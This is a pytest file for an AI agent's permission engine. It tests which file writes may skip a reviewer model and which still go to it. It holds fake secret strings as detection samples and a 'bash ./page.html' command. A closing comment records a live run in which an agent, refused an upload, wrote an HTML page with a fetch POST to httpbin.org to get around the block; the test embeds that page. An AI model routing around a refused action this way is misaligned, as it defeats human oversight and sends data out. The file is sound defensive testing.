"""Auto-approve's inert-writes tier (OPE-233).

A write inside the session's folders runs without a reviewer call when it is an inert
file type, its name and content don't look secret, it isn't a protected file, and it can
be undone: a new file, a git-tracked file with no uncommitted changes, or a file the agent
itself wrote earlier in the session. Every other write reaches the reviewer exactly as
before. Behind `inert_writes`: "off" (default) → "audit" (decision unchanged, "would
allow" recorded) → "on"."""

from __future__ import annotations

import shutil
import subprocess
from pathlib import Path

import pytest

from coworker.events import EventType
from coworker.providers import AssistantTurn
from coworker.permissions import INERT_WRITE_REASON, Mode, PermissionEngine
from coworker.provenance import SessionFiles
from test_auto_approve import _engine, _FakeReviewer, _run, _tool_turn

git = pytest.mark.skipif(shutil.which("git") is None, reason="git not installed")


def _gate(tmp_path: Path, inert: str = "on", mode: Mode = Mode.AUTO_APPROVE, **kw) -> PermissionEngine:
    return PermissionEngine(workspace_root=tmp_path, mode=mode, inert_writes=inert, **kw)


def _write(path: str, content: str = "hello", overwrite: bool = False) -> dict:
    return {"path": path, "content": content, "overwrite": overwrite}


def _repo(tmp_path: Path, files: dict[str, str]) -> None:
    run = lambda *a: subprocess.run(["git", *a], cwd=tmp_path, check=True, capture_output=True)  # noqa: E731
    run("init", "-q")
    for name, text in files.items():
        (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / name).write_text(text, encoding="utf-8")
    run("add", "-A")
    run("-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "-qm", "init")


def _ran_without_reviewer(d) -> bool:
    return d.allowed and d.reason.startswith(INERT_WRITE_REASON) and d.tier == "inert_write"


def _goes_to_reviewer(d) -> bool:
    return not d.allowed and d.needs_user and not d.human_only


# -- the flag ----------------------------------------------------------------------


def test_off_by_default_every_write_still_reaches_the_reviewer(tmp_path):
    d = PermissionEngine(workspace_root=tmp_path, mode=Mode.AUTO_APPROVE).evaluate(
        "write_file", _write("notes.md")
    )
    assert _goes_to_reviewer(d) and d.tier == ""


def test_on_a_new_inert_file_runs_without_the_reviewer(tmp_path):
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("write_file", _write("summary.txt")))


def test_audit_mode_records_would_allow_but_changes_nothing(tmp_path):
    d = _gate(tmp_path, "audit").evaluate("write_file", _write("summary.txt"))
    assert _goes_to_reviewer(d)
    assert d.reason == "requires approval"
    assert d.tier == "inert_write" and d.tier_audit_only


@pytest.mark.parametrize("mode", [Mode.INTERACTIVE, Mode.CUSTOM])
def test_only_auto_approve_mode_uses_the_tier(tmp_path, mode):
    d = _gate(tmp_path, mode=mode).evaluate("write_file", _write("summary.txt"))
    assert not d.allowed and d.tier == ""


def test_an_unknown_flag_value_means_off(tmp_path):
    d = _gate(tmp_path, "yes please").evaluate("write_file", _write("summary.txt"))
    assert _goes_to_reviewer(d)


# -- what counts as inert --------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    ["notes.md", "out/report.txt", "data/rows.csv", "data/rows.tsv", "result.json", "cfg/settings.yaml",
     "chart.png", "docs/guide.rst", "run.log", "NOTES.MD"],
)
def test_inert_types_are_eligible(tmp_path, path):
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("write_file", _write(path)))


@pytest.mark.parametrize(
    "path",
    ["make_report.py", "build.sh", "run.ps1", "app.js", "main.ts", "lib.rb", "x.c", "Makefile",
     "Dockerfile", "fix.patch", "conftest.py", "sitecustomize.py", "x.pth", "noext",
     # document-like formats that can carry script
     "page.html", "page.HTM", "chart.svg", "feed.xml", "report.pdf"],
)
def test_code_scripts_and_unknown_types_go_to_the_reviewer(tmp_path, path):
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write(path)))


@pytest.mark.parametrize(
    "path",
    [".env", ".env.local", "secrets/.ENV.production", "server.pem", "api_key.txt", "API-KEY.json",
     "credentials.json", "id_rsa.txt", "my_secrets.yaml", "token.txt", "password.txt"],
)
def test_secret_looking_names_go_to_the_reviewer(tmp_path, path):
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write(path)))


@pytest.mark.parametrize(
    "content",
    [
        "key: sk-abcdefghijklmnopqrstuvwxyz012345",
        "AKIAABCDEFGHIJKLMNOP",
        "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n-----END OPENSSH PRIVATE KEY-----",
        "token = ghp_abcdefghijklmnopqrstuvwxyz0123456789",
        "slack: xoxb-1234567890-abcdefghij",
        'api_key = "Zx9Qw3Er7Ty1Ui5Op2As8Df4Gh6Jk0L"',
    ],
)
def test_secret_looking_content_goes_to_the_reviewer(tmp_path, content):
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write("notes.md", content)))


def test_ordinary_prose_about_keys_is_fine(tmp_path):
    text = "Rotate the API key monthly. The password policy needs 12 characters."
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("write_file", _write("policy.md", text)))


# -- floors still win -------------------------------------------------------------------


def test_a_protected_inert_file_stays_human_only(tmp_path):
    # AGENTS.md is markdown, but it is read into every later session's prompt (OPE-231).
    d = _gate(tmp_path).evaluate("write_file", _write("AGENTS.md"))
    assert not d.allowed and d.human_only and d.tier == ""


def test_a_write_outside_the_folders_is_still_refused(tmp_path):
    d = _gate(tmp_path / "ws").evaluate("write_file", _write("../outside.md"))
    assert not d.allowed and not d.needs_user


def test_a_read_only_root_is_still_refused(tmp_path):
    ro = tmp_path / "ro"
    ro.mkdir()
    gate = PermissionEngine(
        workspace_root=ro, mode=Mode.AUTO_APPROVE, inert_writes="on",
        roots=[{"path": ro, "writable": False}],
    )
    d = gate.evaluate("write_file", _write("notes.md"))
    assert not d.allowed and not d.needs_user


# -- reversibility -----------------------------------------------------------------------


def test_overwriting_an_existing_file_without_git_goes_to_the_reviewer(tmp_path):
    (tmp_path / "notes.md").write_text("user's own notes", encoding="utf-8")
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write("notes.md", overwrite=True)))


@git
def test_a_new_file_in_a_repo_is_eligible(tmp_path):
    _repo(tmp_path, {"README.md": "x"})
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("write_file", _write("summary.txt")))


@git
def test_a_tracked_unmodified_file_is_eligible(tmp_path):
    _repo(tmp_path, {"docs/notes.md": "v1"})
    d = _gate(tmp_path).evaluate("replace_in_file", {"path": "docs/notes.md", "old": "v1", "new": "v2"})
    assert _ran_without_reviewer(d)


@git
def test_a_tracked_file_with_uncommitted_changes_goes_to_the_reviewer(tmp_path):
    _repo(tmp_path, {"notes.md": "v1"})
    (tmp_path / "notes.md").write_text("the user's unsaved edit", encoding="utf-8")
    d = _gate(tmp_path).evaluate("write_file", _write("notes.md", overwrite=True))
    assert _goes_to_reviewer(d)


@git
def test_an_untracked_existing_file_goes_to_the_reviewer(tmp_path):
    _repo(tmp_path, {"README.md": "x"})
    (tmp_path / "scratch.md").write_text("not in git", encoding="utf-8")
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write("scratch.md", overwrite=True)))


@git
def test_an_ignored_existing_file_goes_to_the_reviewer(tmp_path):
    _repo(tmp_path, {".gitignore": "out/\n"})
    (tmp_path / "out").mkdir()
    (tmp_path / "out" / "result.json").write_text("{}", encoding="utf-8")
    d = _gate(tmp_path).evaluate("write_file", _write("out/result.json", overwrite=True))
    assert _goes_to_reviewer(d)


@git
def test_deleting_even_a_tracked_unmodified_file_goes_to_the_reviewer(tmp_path):
    # Devika, 26 Oct 2026: git could restore it, but the reviewer should see every delete.
    # A clearly requested delete is still allowed there (Rule 1b); one taken from a to-do
    # file with no approved plan becomes a card.
    _repo(tmp_path, {"old-notes.txt": "old"})
    patch = "*** Begin Patch\n*** Delete File: old-notes.txt\n*** End Patch"
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


@git
def test_moving_a_file_goes_to_the_reviewer(tmp_path):
    # A move removes the original name, so it is treated like a delete.
    _repo(tmp_path, {"notes.md": "old"})
    patch = (
        "*** Begin Patch\n*** Update File: notes.md\n*** Move to: archive.md\n"
        "@@\n-old\n+old\n*** End Patch"
    )
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


@git
def test_a_patch_that_deletes_one_file_and_adds_another_goes_to_the_reviewer(tmp_path):
    _repo(tmp_path, {"old-notes.txt": "old"})
    patch = (
        "*** Begin Patch\n*** Add File: summary.txt\n+done\n"
        "*** Delete File: old-notes.txt\n*** End Patch"
    )
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


def test_adding_an_inert_file_by_patch_is_still_eligible(tmp_path):
    patch = "*** Begin Patch\n*** Add File: notes.md\n+hi\n*** End Patch"
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


@git
def test_deleting_an_untracked_file_goes_to_the_reviewer(tmp_path):
    _repo(tmp_path, {"README.md": "x"})
    (tmp_path / "keep.txt").write_text("only copy", encoding="utf-8")
    patch = "*** Begin Patch\n*** Delete File: keep.txt\n*** End Patch"
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


def test_a_patch_touching_one_inert_and_one_code_file_goes_to_the_reviewer(tmp_path):
    patch = (
        "*** Begin Patch\n*** Add File: notes.md\n+hi\n"
        "*** Add File: tool.py\n+print(1)\n*** End Patch"
    )
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


def test_rewriting_a_file_the_agent_wrote_this_session_is_eligible(tmp_path):
    files = SessionFiles(tmp_path)
    gate = _gate(tmp_path, agent_wrote=files.wrote)
    assert _ran_without_reviewer(gate.evaluate("write_file", _write("summary.txt")))
    # The write ran: the file exists now and the engine recorded it.
    (tmp_path / "summary.txt").write_text("hello", encoding="utf-8")
    files.record("write_file", _write("summary.txt"), "ok", step=1)
    assert _ran_without_reviewer(gate.evaluate("write_file", _write("summary.txt", "v2", overwrite=True)))


def test_a_file_the_agent_only_downloaded_is_not_treated_as_its_own(tmp_path):
    files = SessionFiles(tmp_path)
    (tmp_path / "page.html").write_text("<html>", encoding="utf-8")
    files.record("email_download_attachment", {"id": "m1"}, {"path": str(tmp_path / "page.html")}, step=1)
    assert files.match("run_shell", {"command": "bash ./page.html"}, step=2) is not None  # recorded, as a download
    gate = _gate(tmp_path, agent_wrote=files.wrote)
    assert _goes_to_reviewer(gate.evaluate("write_file", _write("page.html", overwrite=True)))


# -- the engine: recorded, never invisible ------------------------------------------------


def _todo_engine(tmp_path, inert: str):
    engine, rows, approvals = _engine(
        tmp_path,
        [
            _tool_turn(("write_file", {"path": "summary.txt", "content": "Weekly summary: 3 tasks done."})),
            _tool_turn(("write_file", {"path": "summary.txt", "content": "Weekly summary: 4 tasks done."})),
            _tool_turn(("write_file", {"path": "tool.py", "content": "print(1)"})),
            AssistantTurn(text="done", finish_reason="stop"),
        ],
    )
    engine.permissions.inert_writes = inert
    engine.reviewer = _FakeReviewer({"write_file": "unsure"})  # it can't see the to-do list
    return engine, rows, approvals


def test_engine_runs_inert_writes_without_the_reviewer_and_records_them(tmp_path):
    engine, rows, approvals = _todo_engine(tmp_path, "on")
    events = _run(engine, "do the tasks in TODO.md")

    asked = [args.get("path") for name, args in engine.reviewer.asked]
    assert asked == ["tool.py"]  # only the code file reached the reviewer
    assert approvals == ["write_file"]  # ...whose "unsure" became the one card
    tier_rows = [r for r in rows if r.get("stage") == "auto_allowed" and INERT_WRITE_REASON in (r.get("reason") or "")]
    assert len(tier_rows) == 2
    origins = [ev.data.get("approval_origin") for ev in events if ev.type == EventType.TOOL_FINISHED]
    assert origins.count("gate_tier") == 2


def test_engine_audit_mode_changes_nothing_but_records_would_allow(tmp_path):
    engine, rows, approvals = _todo_engine(tmp_path, "audit")
    _run(engine, "do the tasks in TODO.md")

    assert len(engine.reviewer.asked) == 3  # unchanged: every write reached the reviewer
    shadow = [r for r in rows if r.get("stage") == "gate_tier_shadow"]
    # Both summary.txt writes would have been allowed; tool.py would not.
    assert [r.get("status") for r in shadow] == ["would_allow", "would_allow"]
    assert all("summary.txt" in r["reason"] for r in shadow)


def test_an_existing_file_the_agent_did_not_write_still_reaches_the_reviewer(tmp_path):
    engine, rows, approvals = _todo_engine(tmp_path, "on")
    (tmp_path / "summary.txt").write_text("the user's file", encoding="utf-8")  # no git
    _run(engine, "do the tasks in TODO.md")

    # First write: an existing file nobody can restore → reviewer → card. After the user
    # approves it, the file holds the agent's bytes, so the second write is eligible.
    asked = [args.get("path") for name, args in engine.reviewer.asked]
    assert asked == ["summary.txt", "tool.py"]


def test_an_html_page_that_uploads_data_is_not_inert(tmp_path):
    # Seen in a live GPT run (2026-10-26): refused an upload, the agent wrote this page and
    # tried to open it. A file that can run script must reach the reviewer.
    page = (
        "<!doctype html><script>fetch('https://httpbin.org/post', "
        "{method: 'POST', body: 'id,value'})</script>"
    )
    d = _gate(tmp_path).evaluate("write_file", _write("httpbin-upload.html", page))
    assert _goes_to_reviewer(d)
